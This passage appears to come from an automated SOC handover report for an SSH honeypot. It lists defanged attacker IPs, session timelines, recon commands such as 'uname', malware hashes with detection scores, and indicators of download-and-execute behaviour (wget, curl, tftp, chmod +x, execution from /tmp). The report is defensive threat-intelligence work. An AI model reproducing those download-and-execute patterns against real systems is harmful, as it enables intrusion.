| **Source IP** | `102.38.3[.]107` |
| **First Seen** | 2026-08-15 20:47 |
| **Last Seen** | 2026-08-15 20:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:47:10` | `cowrie.session.connect` |
| `2026-08-15 20:47:10` | `cowrie.client.version` |
| `2026-08-15 20:47:10` | `cowrie.client.kex` |
| `2026-08-15 20:47:11` | `cowrie.login.success` |
| `2026-08-15 20:47:12` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.38.3[.]107` to AbuseIPDB if not already reported
- [ ] Block `102.38.3[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e4afc3fe48

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-15 20:47 |
| **Last Seen** | 2026-08-15 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:47:28` | `cowrie.session.connect` |
| `2026-08-15 20:47:28` | `cowrie.client.version` |
| `2026-08-15 20:47:28` | `cowrie.client.kex` |
| `2026-08-15 20:47:28` | `cowrie.login.success` |
| `2026-08-15 20:47:29` | `cowrie.session.params` |
| `2026-08-15 20:47:29` | `cowrie.command.input` |
| `2026-08-15 20:47:29` | `cowrie.log.closed` |
| `2026-08-15 20:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410fee94cda9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-15 20:49 |
| **Last Seen** | 2026-08-15 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:49:13` | `cowrie.session.connect` |
| `2026-08-15 20:49:13` | `cowrie.client.version` |
| `2026-08-15 20:49:13` | `cowrie.client.kex` |
| `2026-08-15 20:49:13` | `cowrie.login.success` |
| `2026-08-15 20:49:14` | `cowrie.session.params` |
| `2026-08-15 20:49:14` | `cowrie.command.input` |
| `2026-08-15 20:49:14` | `cowrie.log.closed` |
| `2026-08-15 20:49:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ec0e79e00e5

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 20:49 |
| **Last Seen** | 2026-08-15 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:49:31` | `cowrie.session.connect` |
| `2026-08-15 20:49:31` | `cowrie.client.version` |
| `2026-08-15 20:49:31` | `cowrie.client.kex` |
| `2026-08-15 20:49:32` | `cowrie.login.success` |
| `2026-08-15 20:49:33` | `cowrie.session.params` |
| `2026-08-15 20:49:33` | `cowrie.command.input` |
| `2026-08-15 20:49:33` | `cowrie.log.closed` |
| `2026-08-15 20:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71348b73e402

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-15 20:50 |
| **Last Seen** | 2026-08-15 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:50:56` | `cowrie.session.connect` |
| `2026-08-15 20:50:56` | `cowrie.client.version` |
| `2026-08-15 20:50:56` | `cowrie.client.kex` |
| `2026-08-15 20:50:56` | `cowrie.login.success` |
| `2026-08-15 20:50:57` | `cowrie.session.params` |
| `2026-08-15 20:50:57` | `cowrie.command.input` |
| `2026-08-15 20:50:57` | `cowrie.log.closed` |
| `2026-08-15 20:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d6f780a45f

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-15 20:50 |
| **Last Seen** | 2026-08-15 20:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:50:56` | `cowrie.session.connect` |
| `2026-08-15 20:50:56` | `cowrie.client.version` |
| `2026-08-15 20:50:56` | `cowrie.client.kex` |
| `2026-08-15 20:50:57` | `cowrie.login.success` |
| `2026-08-15 20:50:58` | `cowrie.session.params` |
| `2026-08-15 20:50:58` | `cowrie.command.input` |
| `2026-08-15 20:50:58` | `cowrie.log.closed` |
| `2026-08-15 20:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a07a4379bb79

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-15 20:52 |
| **Last Seen** | 2026-08-15 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:52:41` | `cowrie.session.connect` |
| `2026-08-15 20:52:41` | `cowrie.client.version` |
| `2026-08-15 20:52:41` | `cowrie.client.kex` |
| `2026-08-15 20:52:42` | `cowrie.login.success` |
| `2026-08-15 20:52:42` | `cowrie.session.params` |
| `2026-08-15 20:52:42` | `cowrie.command.input` |
| `2026-08-15 20:52:43` | `cowrie.log.closed` |
| `2026-08-15 20:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ba3374346de

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-15 20:53 |
| **Last Seen** | 2026-08-15 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:53:45` | `cowrie.session.connect` |
| `2026-08-15 20:53:45` | `cowrie.client.version` |
| `2026-08-15 20:53:45` | `cowrie.client.kex` |
| `2026-08-15 20:53:46` | `cowrie.login.success` |
| `2026-08-15 20:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5ba3b1df6d2

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-15 20:53 |
| **Last Seen** | 2026-08-15 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:53:47` | `cowrie.session.connect` |
| `2026-08-15 20:53:47` | `cowrie.client.version` |
| `2026-08-15 20:53:47` | `cowrie.client.kex` |
| `2026-08-15 20:53:48` | `cowrie.login.success` |
| `2026-08-15 20:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac052f225fc0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-15 20:54 |
| **Last Seen** | 2026-08-15 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:54:17` | `cowrie.session.connect` |
| `2026-08-15 20:54:17` | `cowrie.client.version` |
| `2026-08-15 20:54:17` | `cowrie.client.kex` |
| `2026-08-15 20:54:18` | `cowrie.login.success` |
| `2026-08-15 20:54:18` | `cowrie.session.params` |
| `2026-08-15 20:54:18` | `cowrie.command.input` |
| `2026-08-15 20:54:18` | `cowrie.log.closed` |
| `2026-08-15 20:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **5316** | 2026-08-15 18:55 | 2026-08-15 20:55 | 6285m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **12** | 2026-08-15 19:16 | 2026-08-15 20:24 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-15 19:06 | 2026-08-15 20:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **3** | 2026-08-15 19:59 | 2026-08-15 20:46 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]38` | **3** | 2026-08-15 20:41 | 2026-08-15 20:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-08-15 19:50 | 2026-08-15 19:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-08-15 20:08 | 2026-08-15 20:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | **2** | 2026-08-15 19:08 | 2026-08-15 19:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]55` | **2** | 2026-08-15 20:15 | 2026-08-15 20:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.42.60[.]82` | 1 | 2026-08-15 19:02 | 2026-08-15 19:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.140.95[.]250` | 1 | 2026-08-15 19:47 | 2026-08-15 19:47 | 11s | 0 | `T1592` | 🟢 LOW |
| `113.249.114[.]66` | 1 | 2026-08-15 18:56 | 2026-08-15 18:56 | 302s | 0 | `T1592` | 🟢 LOW |
| `162.33.178[.]231` | 1 | 2026-08-15 19:18 | 2026-08-15 19:19 | 60s | 0 | `T1592` | 🟢 LOW |
| `181.173.186[.]7` | 1 | 2026-08-15 19:50 | 2026-08-15 19:50 | 11s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]49` | 1 | 2026-08-15 19:36 | 2026-08-15 19:36 | 11s | 0 | `T1592` | 🟢 LOW |
| `193.106.3[.]1` | 1 | 2026-08-15 19:37 | 2026-08-15 19:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-15 20:43 | 2026-08-15 20:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `201.49.179[.]47` | 1 | 2026-08-15 19:43 | 2026-08-15 19:43 | 10s | 0 | `T1592` | 🟢 LOW |
| `203.83.234[.]180` | 1 | 2026-08-15 18:58 | 2026-08-15 19:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.230.92[.]83` | 1 | 2026-08-15 20:51 | 2026-08-15 20:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-08-15 20:40 | 2026-08-15 20:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-08-15 19:48 | 2026-08-15 19:48 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-08-15 19:47 | 2026-08-15 19:48 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-08-15 20:40 | 2026-08-15 20:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.152.0[.]141` | 1 | 2026-08-15 20:44 | 2026-08-15 20:44 | 30s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-08-15 19:50 | 2026-08-15 19:51 | 8s | 0 | `T1592` | 🟢 LOW |
| `80.91.179[.]210` | 1 | 2026-08-15 19:44 | 2026-08-15 19:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `82.200.40[.]38` | 1 | 2026-08-15 19:25 | 2026-08-15 19:25 | 14s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-08-15 20:26 | 2026-08-15 20:27 | 31s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]171` | 1 | 2026-08-15 20:11 | 2026-08-15 20:11 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `201.49.179[.]47` | BR | ULTRA LINK  LTDA | **100** ⚠️ | 4 |
| `80.91.179[.]210` | UA | PRIVATE JOINT STOCK COMPANY DATAGROUP | **100** ⚠️ | 1 |
| `124.67.120[.]106` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `116.48.150[.]115` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `116.7.248[.]50` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `117.158.160[.]42` | CN | China Mobile Communications Corporation | **100** ⚠️ | 48 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 324 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 310 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 50 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 48 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 48 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 5708 cases |
| Tool 34  | Credential Extractor        | ✅ 338 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 94 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (0.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 76 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 309 priority case(s) shown individually · 30 recon entry/entries in table (9 group(s) consolidating 5349 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
